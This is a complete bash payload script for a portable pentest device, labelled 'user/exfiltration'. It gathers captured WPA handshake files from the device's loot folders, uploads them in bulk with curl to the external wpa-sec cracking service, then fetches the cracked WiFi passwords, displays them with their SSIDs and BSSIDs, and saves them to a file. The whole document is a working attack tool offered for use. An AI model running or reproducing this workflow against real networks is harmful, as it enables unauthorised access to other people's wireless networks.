#!/bin/bash
# ============================================================================
# Title: WPA-SEC Tools
# Description: Bulk upload handshakes and check cracked passwords from wpa-sec
# Author: Aitema-GmbH
# Version: 1.3
# Category: user/exfiltration
# ============================================================================
#
# This payload provides tools for interacting with wpa-sec.stanev.org:
#   1. Bulk Upload - Upload all captured handshakes at once
#   2. Check Results - View cracked passwords
#   3. Setup - Configure API key
#
# wpa-sec.stanev.org is a free distributed WPA/WPA2 cracking service.
#
# Requirements:
#   - Internet connection
#   - WPA-SEC API key (get free at https://wpa-sec.stanev.org/?get_key)
#
# ============================================================================

shopt -s nullglob

# =========================
# CONFIGURATION
# =========================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_FILE="${SCRIPT_DIR}/config.sh"
GLOBAL_CONFIG="/root/config/wpa-sec.conf"
LOOT_DIR="/root/loot/wpa-sec"
WPA_SEC_URL="https://wpa-sec.stanev.org"

# =========================
# CLEANUP
# =========================
cleanup() {
    LED SETUP
}
trap cleanup EXIT INT TERM

# =========================
# LOAD CONFIG
# =========================
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
    elif [ -f "$GLOBAL_CONFIG" ]; then
        source "$GLOBAL_CONFIG"
    fi
}

# =========================
# SETUP FUNCTION
# =========================
run_setup() {
    LED SETUP
    LOG cyan "=========================================="
    LOG cyan "  WPA-SEC SETUP"
    LOG cyan "=========================================="
    LOG ""

    # Check current config
    load_config
    if [ -n "$WPA_SEC_KEY" ] && [ "$WPA_SEC_KEY" != "YOUR_API_KEY_HERE" ]; then
        LOG green "Current API key: ${WPA_SEC_KEY:0:8}..."
        LOG ""
        RESP=$(CONFIRMATION_DIALOG "WPA-SEC is configured.\n\nReconfigure?")
        case "$RESP" in
            "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED")
                LOG yellow "Setup cancelled"
                return 0
                ;;
        esac
    fi

    # Get new API key
    LOG "Enter your WPA-SEC API key"
    LOG "Get it at: wpa-sec.stanev.org/?get_key"
    LOG ""

    NEW_KEY=$(TEXT_PICKER "WPA-SEC API Key" "")
    if [ -z "$NEW_KEY" ]; then
        ERROR_DIALOG "API key cannot be empty!"
        return 1
    fi

    # Test the key
    LOG "Testing API key..."
    LED ATTACK

    response=$(curl -s "${WPA_SEC_URL}/?api" \
        -H "Cookie: key=$NEW_KEY" \
        --connect-timeout 10 \
        --max-time 30 \
        2>&1)

    if echo "$response" | grep -qi "error\|invalid\|denied\|unauthorized"; then
        LED FAIL
        ERROR_DIALOG "Invalid API key!\n\nCheck your key at:\nwpa-sec.stanev.org/?get_key"
        return 1
    fi

    # Save configuration
    mkdir -p "$(dirname "$GLOBAL_CONFIG")"
    cat > "$GLOBAL_CONFIG" << CONF
# WPA-SEC Configuration
# Generated by WPA-SEC Tools
WPA_SEC_KEY="$NEW_KEY"
AUTO_UPLOAD="true"
VIBRATE_ON_SUCCESS="true"
SHOW_ALERT="true"
CONNECT_TIMEOUT="30"
MAX_TIME="120"
CONF
    chmod 600 "$GLOBAL_CONFIG"

    LED FINISH
    VIBRATE
    LOG green "=========================================="
    LOG green "  SETUP COMPLETE!"
    LOG green "=========================================="
    ALERT "WPA-SEC Configured!\n\nAuto-upload: ENABLED\n\nUse 'Check Results' to\nsee cracked passwords!"
}

# =========================
# BULK UPLOAD FUNCTION
# =========================
run_bulk_upload() {
    load_config

    if [ -z "$WPA_SEC_KEY" ] || [ "$WPA_SEC_KEY" = "YOUR_API_KEY_HERE" ]; then
        ERROR_DIALOG "WPA-SEC not configured!\n\nRun Setup first."
        return 1
    fi

    mkdir -p "$LOOT_DIR"
    TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
    LOG_FILE="$LOOT_DIR/bulk_upload_$TIMESTAMP.log"

    LED SETUP
    LOG cyan "=========================================="
    LOG cyan "  WPA-SEC BULK UPLOAD"
    LOG cyan "=========================================="
    LOG ""

    # Find all PCAP files
    PCAP_FILES=()

    # Standard locations
    for dir in "/root/loot/handshakes" "/root/loot/dragonblood" "/root/loot/dragonblood/captures"; do
        if [ -d "$dir" ]; then
            for f in "$dir"/*.pcap "$dir"/*.pcapng "$dir"/*.cap; do
                [ -f "$f" ] && PCAP_FILES+=("$f")
            done
        fi
    done

    # Archive locations
    if [ -d "/root/loot/archive" ]; then
        for subdir in /root/loot/archive/*/; do
            for f in "$subdir"handshakes/*.pcap "$subdir"handshakes/*.pcapng "$subdir"handshakes/*.cap; do
                [ -f "$f" ] && PCAP_FILES+=("$f")
            done
        done
    fi

    TOTAL=${#PCAP_FILES[@]}

    if [ "$TOTAL" -eq 0 ]; then
        ERROR_DIALOG "No handshakes found!\n\nCapture some handshakes first."
        return 0
    fi

    LOG "Found: $TOTAL PCAP files"
    LOG ""

    # Confirm upload
    RESP=$(CONFIRMATION_DIALOG "Upload $TOTAL files to\nwpa-sec.stanev.org?")
    case "$RESP" in
        "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED")
            LOG yellow "Upload cancelled"
            return 0
            ;;
    esac

    # Upload files
    LED ATTACK
    SUCCESS=0
    FAIL=0
    SKIP=0

    for i in "${!PCAP_FILES[@]}"; do
        file="${PCAP_FILES[$i]}"
        filename=$(basename "$file")
        current=$((i + 1))

        LOG "[$current/$TOTAL] $filename"

        # Skip empty files
        if [ ! -s "$file" ]; then
            LOG yellow "  Skip (empty)"
            SKIP=$((SKIP + 1))
            continue
        fi

        # Upload
        response=$(curl -s -X POST "$WPA_SEC_URL" \
            -H "Cookie: key=$WPA_SEC_KEY" \
            -F "file=@$file;filename=$filename" \
            --connect-timeout 30 \
            --max-time 120 \
            2>&1)

        if echo "$response" | grep -qi "processed cap files\|written to 22000\|EAPOL pairs written\|PMKID.*written"; then
            LOG green "  OK"
            SUCCESS=$((SUCCESS + 1))
        elif echo "$response" | grep -qi "already\|duplicate"; then
            LOG yellow "  Skip (already uploaded)"
            SKIP=$((SKIP + 1))
        else
            LOG red "  FAIL"
            FAIL=$((FAIL + 1))
            echo "$file" >> "$LOOT_DIR/failed_uploads_$TIMESTAMP.txt"
        fi

        # Rate limiting
        sleep 0.5
    done

    # Summary
    LOG ""
    LOG cyan "=========================================="
    LOG cyan "  UPLOAD COMPLETE"
    LOG cyan "=========================================="
    LOG green "Success: $SUCCESS"
    LOG yellow "Skipped: $SKIP"
    LOG red "Failed:  $FAIL"

    echo "[$TIMESTAMP] Bulk upload: $SUCCESS success, $SKIP skipped, $FAIL failed" >> "$LOOT_DIR/bulk_upload.log"

    LED FINISH
    VIBRATE
    ALERT "Bulk Upload Complete!\n\nUploaded: $SUCCESS\nSkipped: $SKIP\nFailed: $FAIL\n\nCheck results at:\nwpa-sec.stanev.org/?my_nets"
}

# =========================
# CHECK RESULTS FUNCTION
# =========================
run_check_results() {
    load_config

    if [ -z "$WPA_SEC_KEY" ] || [ "$WPA_SEC_KEY" = "YOUR_API_KEY_HERE" ]; then
        ERROR_DIALOG "WPA-SEC not configured!\n\nRun Setup first."
        return 1
    fi

    mkdir -p "$LOOT_DIR"
    RESULTS_FILE="$LOOT_DIR/cracked_passwords.txt"

    LED ATTACK
    LOG cyan "=========================================="
    LOG cyan "  WPA-SEC RESULTS"
    LOG cyan "=========================================="
    LOG ""
    LOG "Fetching cracked passwords..."
    LOG ""

    # Fetch results
    response=$(curl -s "${WPA_SEC_URL}/?api&dl=1" \
        -H "Cookie: key=$WPA_SEC_KEY" \
        --connect-timeout 30 \
        --max-time 60 \
        2>&1)

    if [ -z "$response" ]; then
        LED FAIL
        ERROR_DIALOG "Failed to connect!\n\nCheck internet connection."
        return 1
    fi

    # Parse and display results
    # Format: BSSID_HEX:CLIENT_HEX:SSID:PASSWORD
    COUNT=0
    > "$RESULTS_FILE"

    echo "$response" | while IFS=: read -r bssid_hex client_hex ssid password rest; do
        if [ -n "$password" ]; then
            # Handle passwords containing colons
            if [ -n "$rest" ]; then
                password="$password:$rest"
            fi

            # Format BSSID with colons
            bssid=$(echo "$bssid_hex" | sed 's/\(..\)/\1:/g; s/:$//' | tr 'a-f' 'A-F')

            COUNT=$((COUNT + 1))

            LOG green "----------------------------------------"
            LOG cyan "SSID:     $ssid"
            LOG "BSSID:    $bssid"
            LOG yellow "PASSWORD: $password"

            echo "SSID: $ssid" >> "$RESULTS_FILE"
            echo "BSSID: $bssid" >> "$RESULTS_FILE"
            echo "PASSWORD: $password" >> "$RESULTS_FILE"
            echo "---" >> "$RESULTS_FILE"
        fi
    done

    # Count results
    COUNT=$(grep -c "^PASSWORD:" "$RESULTS_FILE" 2>/dev/null || echo "0")

    LOG ""
    LOG green "----------------------------------------"

    if [ "$COUNT" -gt 0 ]; then
        LED FINISH
        LOG green "Found $COUNT cracked password(s)!"
        LOG ""
        LOG "Saved to: $RESULTS_FILE"

        VIBRATE
        VIBRATE

        FIRST_RESULTS=$(head -20 "$RESULTS_FILE" 2>/dev/null | head -c 400)
        ALERT "CRACKED PASSWORDS!\n\nFound: $COUNT\n\n$FIRST_RESULTS\n\nSaved to:\n$RESULTS_FILE"
    else
        LED SETUP
        LOG yellow "No cracked passwords yet."
        LOG ""
        LOG "Your handshakes are being"
        LOG "processed by the distributed"
        LOG "cracking network."
        LOG ""
        LOG "Check back later!"

        ALERT "No Results Yet\n\nYour handshakes are being\nprocessed by the distributed\ncracking network.\n\nCheck back in a few hours!"
    fi
}

# =========================
# MAIN MENU
# =========================
LED SETUP
LOG cyan "=========================================="
LOG cyan "  WPA-SEC TOOLS"
LOG cyan "=========================================="
LOG ""
LOG "wpa-sec.stanev.org integration"
LOG ""

# Check if configured
load_config
if [ -z "$WPA_SEC_KEY" ] || [ "$WPA_SEC_KEY" = "YOUR_API_KEY_HERE" ]; then
    LOG yellow "Not configured - run Setup first"
else
    LOG green "API key: ${WPA_SEC_KEY:0:8}..."
fi
LOG ""

# Menu
CHOICE=$(NUMBER_PICKER "Select action:\n\n1. Bulk Upload Handshakes\n2. Check Cracked Passwords\n3. Setup / Configure" 1)

case "$CHOICE" in
    1)
        run_bulk_upload
        ;;
    2)
        run_check_results
        ;;
    3)
        run_setup
        ;;
    *)
        LOG yellow "Invalid choice"
        exit 0
        ;;
esac

exit 0
